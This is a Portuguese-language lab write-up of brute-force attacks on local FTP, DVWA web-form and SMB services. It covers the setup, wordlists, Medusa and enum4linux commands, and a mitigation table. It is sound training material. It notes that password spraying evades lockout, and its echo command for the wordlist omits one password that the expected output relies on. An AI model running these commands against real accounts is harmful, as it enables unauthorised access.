# Ataque de Força Bruta com Kali Linux e Medusa

## 📋 Objetivo

Simular cenários de ataque de força bruta em serviços vulneráveis (FTP, formulário web via DVWA e SMB), documentar o processo e propor medidas de mitigação, utilizando o Kali Linux e a ferramenta Medusa.

---

## 🖥️ Ambiente de Teste

### Infraestrutura

- **Docker** para subir serviços vulneráveis em containers leves (DVWA)
- **Serviços locais** (vsftpd, Samba) configurados propositalmente com credenciais fracas, atacados via `localhost` (127.0.0.1)

### Ferramentas utilizadas

| Ferramenta | Função |
|---|---|
| Kali Linux | Sistema operacional de ataque |
| Medusa | Ferramenta de força bruta |
| Docker | Virtualização leve de serviços (DVWA) |
| vsftpd | Servidor FTP vulnerável (local) |
| Samba | Servidor SMB vulnerável (local) |
| enum4linux | Enumeração de usuários SMB |

---

## ⚙️ Configuração do Ambiente

### 1. Docker + DVWA

```bash
sudo apt update
sudo apt install -y docker.io
sudo systemctl start docker
sudo systemctl enable docker
sudo usermod -aG docker $USER
```

Subindo o DVWA:
```bash
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
```

Acesso: `http://127.0.0.1:8080`
- Inicialização: botão **Create / Reset Database**
- Login padrão: `admin` / `password`
- Nível de segurança ajustado em **DVWA Security → Low**

> **Observação:** ao acessar pela primeira vez, o navegador pode tentar forçar HTTPS automaticamente (erro `SSL_ERROR_RX_RECORD_TOO_LONG`). Solução: desativar o modo "HTTPS-Only" do navegador para esse endereço, já que o serviço roda apenas em HTTP.

### 2. FTP vulnerável (vsftpd local)

```bash
sudo apt install vsftpd
sudo useradd -m testuser
sudo passwd testuser   # senha fraca definida propositalmente para o teste
sudo systemctl start vsftpd
```

### 3. SMB vulnerável (Samba local)

```bash
sudo apt install samba
sudo smbpasswd -a testuser   # senha fraca definida propositalmente para o teste
sudo systemctl start smbd
```

---

## 📝 Wordlists

Wordlists simples e pequenas, criadas propositalmente para utilizar pouco tempo.

**Usuários (`users.txt`):**
```
testuser
admin
root
user
service
```

**Senhas (`passwords.txt`):**
```
123456
admin
password
administrator
root
letmein
toor
```

Criação via terminal:
```bash
echo -e "testuser\nadmin\nroot\nuser\nservice" > users.txt
echo -e "123456\nadmin\npassword\nroot\nletmein\ntoor" > passwords.txt
```
---

## 🎯 Testes Realizados

### 1. Força bruta em FTP

```bash
medusa -h 127.0.0.1 -u testuser -P passwords.txt -M ftp
```

**Saída esperada em caso de sucesso:**
```
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: testuser Password: administrator [SUCCESS]
```

---

### 2. Automação de tentativas em formulário web (DVWA — Brute Force)

Antes de montar o comando, foi necessário inspecionar o formulário (F12 → DevTools) para identificar:
- Método HTTP (GET/POST)
- Nomes dos campos (`username`, `password`, `Login`)
- Mensagem de falha de login (ex.: "Username and/or password incorrect")

Comando utilizado:
```bash
medusa -h 127.0.0.1 -u admin -P passwords.txt -M web-form \
-m FORM:"/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login" \
-m DENY-SIGNAL:"Username and/or password incorrect"
```
---

### 3. Password spraying em SMB com enumeração de usuários

**Enumeração de usuários:**
```bash
enum4linux -U 127.0.0.1
```

**Spraying (uma senha comum testada contra múltiplos usuários, reduzindo risco de bloqueio de conta):**
```bash
medusa -h 127.0.0.1 -U users.txt -p "123456" -M smbnt
```
---

## 🔒 Recomendações de Mitigação

| Vulnerabilidade explorada | Recomendação |
|---|---|
| Senhas fracas | Política de senhas fortes, com complexidade mínima e rotação periódica |
| Ausência de bloqueio de tentativas | Implementar lockout de conta após N tentativas falhas (ex.: fail2ban) |
| Falta de segundo fator | Habilitar MFA (autenticação multifator) sempre que possível |
| Serviços legados expostos (FTP anônimo, SMBv1) | Desabilitar protocolos obsoletos e versões inseguras |
| Formulários web sem proteção | Implementar CAPTCHA, rate limiting e delays progressivos |
| Falta de monitoramento | Configurar alertas e logs de tentativas repetidas de login (SIEM/IDS) |
| Enumeração de usuários exposta | Restringir enumeração anônima via SMB/null session |

---

## 📚 Lições Aprendidas

- Como configurar e adaptar um ambiente de laboratório de pentest conforme limitações de hardware, mantendo a validade didática do exercício.
- Diferença prática entre ataques de **força bruta tradicional** (muitas senhas, um usuário) e **password spraying** (uma senha, muitos usuários) — e por que o segundo é mais furtivo frente a políticas de bloqueio.
- Importância da fase de reconhecimento (inspeção de formulários, enumeração de usuários) antes de qualquer tentativa de ataque automatizado.
- A fragilidade de serviços com configuração padrão/desatualizada e a importância de medidas básicas de hardening.

---
